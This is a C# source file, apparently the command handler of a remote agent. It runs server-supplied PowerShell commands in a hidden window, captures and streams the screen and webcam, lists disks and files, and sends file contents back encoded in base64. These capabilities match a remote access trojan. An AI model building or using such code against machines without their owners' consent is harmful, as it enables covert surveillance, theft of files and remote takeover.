using Libra.Agent.Helper;
using Libra.Agent.Models;
using Libra.Virgo;
using Libra.Virgo.Enum;
using Libra.Virgo.Models.MessageType;
using System;
using System.Buffers.Text;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.Json.Serialization.Metadata;

namespace Libra.Agent.Handle
{
    internal class CommandHandle
    {
        static CommandModel Packet = new();
        private static readonly JsonSerializerOptions AgentJsonOptions = new()
        {
            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
            PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
            WriteIndented = false,
            TypeInfoResolver = AgentJsonContext.Default
        };
        public static async Task Handle(string dataJson)
        {
            if (string.IsNullOrEmpty(dataJson)) return;

            try
            {
                Packet = JsonSerializer.Deserialize<CommandModel>(dataJson, AgentJsonContext.Default.CommandModel);
            }
            catch
            {
                return;
            }

            if (Packet == null) return;

            switch (Packet.Type)
            {
                case CommandType.Shell:
                    var result = await ExecuteCommandAsync(string.Join(" ", Packet.Parameter));
                    var sendResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result)),
                        EndTime = DateTime.Now
                    });
                    break;

                case CommandType.GetFrame:
                    var frame = MonitorHelper.CaptureScreenCompressed((int)(MonitorHelper.GetSystemMetrics(0) / 1.2), (int)(MonitorHelper.GetSystemMetrics(1) / 1.2), 25);
                    var sendframeResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(frame),
                        EndTime = DateTime.Now
                    });
                    break;

                case CommandType.GetFiles:
                    var files = InfoHelper.Files(Packet.Parameter[0]);
                    var sendfilesResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(files, AgentJsonOptions))),
                        EndTime = DateTime.Now
                    });
                    break;

                case CommandType.GetDisks:
                    var disks = InfoHelper.Drives();
                    var senddisksResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(disks, AgentJsonOptions))),
                        EndTime = DateTime.Now
                    });
                    break;

                case CommandType.ReadFile:
                    var filepath = Packet.Parameter[0];
                    if (!File.Exists(filepath))
                    {
                        await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                        {
                            TaskId = Packet.TaskId,
                            Result = "",
                            EndTime = DateTime.Now
                        });
                        return;
                    }

                    var file = File.ReadAllBytes(filepath);
                    var sendfileResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(file),
                        EndTime = DateTime.Now
                    });
                    break;

                case CommandType.GetCameraFrame:

                    int camIdx = Packet.Parameter.Length > 0
                        && int.TryParse(Packet.Parameter[0], out int ci) ? ci : 0;

                    var cameraBytes = MonitorHelper.CaptureCameraFrame(
                        cameraIndex: camIdx,
                        jpegQuality: 60);

                    if (cameraBytes == null || cameraBytes.Length == 0)
                    {
                        break;
                    }

                    var sendcameraResult = await Runtimes.SendMessage(
                        VirgoMessageType.Command,
                        new CommandResult()
                        {
                            TaskId = Packet.TaskId,
                            Result = Convert.ToBase64String(cameraBytes),
                            EndTime = DateTime.Now
                        });

                    break;

                case CommandType.StartCameraStream:
                    int startCamIdx = Packet.Parameter.Length > 0
                        && int.TryParse(Packet.Parameter[0], out int sc) ? sc : 0;
                    int startFps = Packet.Parameter.Length > 1
                        && int.TryParse(Packet.Parameter[1], out int sf) ? sf : 10;
                    CameraStreamer.Start(startCamIdx, Packet.TaskId, startFps);
                    break;

                case CommandType.StopCameraStream:
                    int stopCamIdx = Packet.Parameter.Length > 0
                        && int.TryParse(Packet.Parameter[0], out int stc) ? stc : 0;
                    CameraStreamer.Stop(stopCamIdx);
                    break;

                case CommandType.StartScreenStream:
                    var quality = Packet.Parameter.Length > 0 ? Packet.Parameter[0] : "720p";
                    await ScreenStreamer.StartAsync(Packet.TaskId, quality: quality);
                    break;

                case CommandType.StopScreenStream:
                    ScreenStreamer.Stop();
                    break;

                case CommandType.ReadFileStream:
                    await ReadFileStreamAsync(Packet.TaskId, Packet.Parameter[0]);
                    break;

                default:
                    break;
            }
        }

        public static async Task<string> ExecuteCommandAsync(string command)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " + command + "\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using var process = Process.Start(psi);

            string output = await process.StandardOutput.ReadToEndAsync();
            string error = await process.StandardError.ReadToEndAsync();

            await process.WaitForExitAsync();

            return output + error;
        }

        private const int ChunkSize = 512 * 1024;

        private static async Task ReadFileStreamAsync(Guid taskId, string filepath)
        {
            if (!File.Exists(filepath))
            {
                await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
                {
                    TaskId = taskId,
                    Result = "",
                    EndTime = DateTime.Now
                });
                return;
            }

            try
            {
                using var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.Read);
                var buffer = new byte[ChunkSize];
                int bytesRead;

                while ((bytesRead = await fs.ReadAsync(buffer.AsMemory(0, ChunkSize))) > 0)
                {
                    var chunk = bytesRead == ChunkSize
                        ? buffer
                        : buffer.AsSpan(0, bytesRead).ToArray();

                    await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
                    {
                        TaskId = taskId,
                        Result = Convert.ToBase64String(chunk),
                        EndTime = DateTime.Now
                    });
                }
            }
            catch
            {
            }

            await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
            {
                TaskId = taskId,
                Result = "",
                EndTime = DateTime.Now
            });
        }
    }
}

